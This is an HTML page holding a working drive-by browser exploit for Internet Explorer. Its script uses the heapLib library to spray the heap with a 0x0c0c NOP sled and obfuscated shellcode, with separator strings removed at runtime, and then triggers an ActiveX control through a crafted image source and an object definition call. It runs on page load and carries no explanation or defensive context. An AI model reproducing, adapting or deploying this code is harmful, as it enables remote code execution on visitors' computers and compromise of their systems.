
<html>
<head>
<script>

function heapLib() {
}




heapLib.ie = function(maxAlloc, heapBase) {

    
    this.heapBase = (heapBase ? heapBase : 0x150000);
    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);

    
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    
    this.mem = new Array();

    
    this.flushOleaut32();
}




heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}




heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}




heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}




heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}




heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}




heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}




heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}




heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}




heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    
    CollectGarbage();
}




heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    

    this.freeOleaut32("oleaut32");
    
    

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}




heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    
    this.allocOleaut32(arg, tag);
}



heapLib.ie.prototype.free = function(tag) {

    
    this.freeOleaut32(tag);

    
    this.flushOleaut32();
}




heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}




heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}




heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}




heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}




heapLib.ie.prototype.vtable = function(sssccc, jmpecx, size) {

    var size = (size ? size : 1008);

    
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (sssccc.length*2 > size-138)
        throw("Maximum sssccc length is " + (size-138) + " bytes");

    

    var zero="0";
    var vtable = unescape("%"+"u"+"9"+"0"+"9"+zero+"%u7ceb") ;

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    vtable += unescape("%"+"u0028%"+"u0028") +    
              sssccc + heap.padding((size-138)/2 - sssccc.length);

    return vtable;
}


var heap_obj = new heapLib.ie(0x20000);

var tkscctv = "%udKP5db%uC9C9%u87CD%u9292%uC5C8%u93DKP1%uD6F7%uDFC8%uDE93%uD0D2KP%u8B87%u928B%u92D2%uD5D8%uD893%uD8C5";
var tksccav = "%KPuBKPDBKPD%uBDBKPD%uBDBKPD%uBDBD%uBDBKPD%uBKPDBD%uBDBKPD%uBDBKPD%uEAEA";
tksccav = (tksccav.replace(/KP/g,""));

var codecode = "KP5858KP5858KP10EBKP4B5BKPC933"+"KPB966KP03B8KP3480KPBD0BKPFAE2KP05EBKPEBE8KPFFFFKP54FFKPBEA3KPBDBDKPD9E2KP8D1CKPBDBDKP36BDKPB1FDKPCD36KP10A1KPD536KP36B5KPD74AKPE4ACKP0355KPBDBFKP2DBDKP455FKP8ED5KPBD8FKPD5BDKPCEE8KPCFD8KP36E9KPB1FBKP0355KPBDBCKP36BDKPD755KPE4B8KP2355KPBDBFKP5FBDKPD544KPD3D2KPBDBDKPC8D5KPD1CFKPE9D0KPAB42KP7D38KPAEC8KPD2D5KPBDD3KPD5BDKPCFC8KPD0D1KP36E9KPB1FBKP3355KPBDBCKP36BDKPD755KPE4BCKPD355KPBDBFKP5FBDKPD544KP8ED1KPBD8FKPCED5KPD8D5KPE9D1KPFB36KP55B1KPBCD2KPBDBDKP5536KPBCD7KP55E4KPBFF2KPBDBDKP445FKP513CKPBCBDKPBDBDKP6136KP7E3CKPBD3DKPBDBDKPBDD7KPA7D7KPD7EEKP42BDKPE1EBKP7D8EKP3DFDKPBE81KPC8BDKP7A44KPBEB9KPDBE1KPD893KPF97AKPB9BEKPD8C5KPBDBDKP748EKPECECKPEAEEKP8EECKP367DKPE5FBKP9F55KPBDBCKP3EBDKPBD45KP1E54KPBDBDKP2DBDKPBDD7KPBDD7KPBED7KPBDD7KPBFD7KPBDD5KPBDBDKPEE7DKPFB36KP5599KPBCBCKPBDBDKPFB34KPD7DDKPEDBDKPEB42KP3495KPD9FBKPFB36KPD7DDKPD7BDKPD7BDKPD7BDKPD7B9KPEDBDKPEB42KPD791KPD7BDKPD7BDKPD5BDKPBDA2KPBDB2KP42EDKP81EBKPFB34KP36C5KPD9F3KPC13DKP42B5KPC909KP3DB1KPB5C1KPBD42KPB8C9KPC93DKP42B5KP5F09KP3456KP3D3BKPBDBDKP7ABDKPCDFBKPBDBDKPBDBDKPFB7AKPBDC9KPBDBDKPD7BDKPD7BDKPD7BDKP36BDKPDDFBKP42EDKP85EBKP3B36KPBD3DKPBDBDKPBDD7KPF330KPECC9KPCB42KPEDCDKPCB42KP42DDKP8DEBKPCB42KP42DDKP89EBKPCB42KP42C5KPFDEBKP4636KP7D8EKP668EKP513CKPBFBDKPBDBDKP7136KP453EKPC0E9KP34B5KPBCA1KP7D3EKP56B9KP364EKP3671KP3E64KPAD7EKP7D8EKPECEDKPEDEEKPEDEDKPEDEDKPEAEDKPEDEDKPEB42KP36B5KPE9C3KPAD55KPBDBCKP55BDKPBDD8KPBDBDKPDED5KPCACBKPD5BDKPD5CEKPD2D9KP36E9KPB1FBKP9955KPBDBDKP34BDKP81FBKP1CD9KPBDB9KPBDBDKP1D30KP42DDKP4242KPD8D7KPCB42KP3681KPADFBKPB555KPBDBDKP8EBDKPEE66KPEEEEKP42EEKP3D6DKP5585KP853DKPC854KP3CACKPB8C5KP2D2DKP2D2DKPB5C9KP4236KP36E8KP3051KPB8FDKP5D42KP1B55KPBDBDKP7EBDKP1D55KPBDBDKP05BDKPBCACKP3DB9KPB17FKP55BDKPBD2EKPBDBDKP513CKPBCBDKPBDBDKP4136KP7A3EKP7AB9KP8FBAKP2CC9KP7AB1KPB9FAKP34DEKPF26CKPFA7AKP1DB5KP2AD8KP7A76KPB1FAKPFDECKPC207KPFA7AKP83ADKP0BA0KP7A84KPA9FAKPD405KPA669KPFA7AKP03A5KPDBC2KP7A1DKPA1FAKP1441KP108AKPFA7AKP259DKPADB7KPD945KP8D1CKPBDBDKP36BDKPB1FDKPCD36KP10A1KPD536KP36B5KPD74AKPE4B9KPE955KPBDBDKP2DBDKP455FKP8ED5KPBD8FKPD5BDKPCEE8KPCFD8KP36E9KP55BBKP42E8KP4242KP5536KPB8D7KP55E4KPBD88"+"KPBDBDKP445FKP428EKP42EAKPB9EBKPBF56KP7EE5KP4455KP4242KPE642KPBA7BKP3405KPBCE2KP7ADBKPB8FAKP5D42KPEE7EKP6136KPD7EEKPD5FDKPADBDKPBDBDKP36EAKP9DFBKPA555KP4242KPE542KPEC7EKP36EBKP81C8KPC936KPC593KP48BEKP36EBKP9DCBKP48BEKP748EKPFCF4KPBE10KP8E78KPB266KPAD03KP6B87KPB5C9KP767CKPBEBAKPFD67KP4C56KPA286KP5AC8KP36E3KP99E3KP60BEKP36DBKPF6B1KPE336KPBEA1KP3660KP36B9KP78BEKPE316KP7EE4KP6055KP4241KP0F42KP5F4FKP8449KPC05FKP673EKPC6F5KP8F80KP2CC9KP38B1KP1262KPDE06KP6C34KPECF2KP07FDKP1DC2KP2AD8KPA376KPD919KP2E52KP598FKP3329KPB7AEKP7F11KPF6A4KP79BCKPA230KPEAC9KPB0DBKPFE42KP1103KPC066KP184DKPEF27KP1A43KP8367KP0BA0KP0584KP69D4KP03A6KPDBC2KP411DKP8A14KP2510KPADB7KP3D45KP126BKP4627KPA8EE" ;

tkscctv = (tkscctv.replace(/KP/g,""));
var code =(codecode.replace(/KP/g,"%u"))+ tkscctv+tksccav;

code =unescape(code);
var ze="0";
var nops = unescape("%u"+ze+"c"+ze+"c%"+"u"+ze+"c0c");

while (nops.length < 0x80000) nops += nops;

var offset = nops.substring(0, 0x100);
var sssccc = offset + code + nops.substring(0, 0x800-code.length-offset.length);

while (sssccc.length < 0x40000) sssccc += sssccc;
var block = sssccc.substring(0, (0x80000-6)/2);


heap_obj.gc();
for (var z=1; z < 0x230; z++) {
	heap_obj.alloc(block);
}


</script>
</head>
<body>
<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="VPMD"></object>
<script>
var obj = document.getElementById('VPMD').object;
var zf="0";
var src = unescape("%u"+zf+"c"+zf+"8%u"+zf+"c0c");
while (src.length < 0x1002) src += src;
src = "\\\\xxx" + src;
var pb="0"; src = src.substr(0, 0x1000 - 10);
var pa="0"; var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(764);
</script>
</body>
</html>
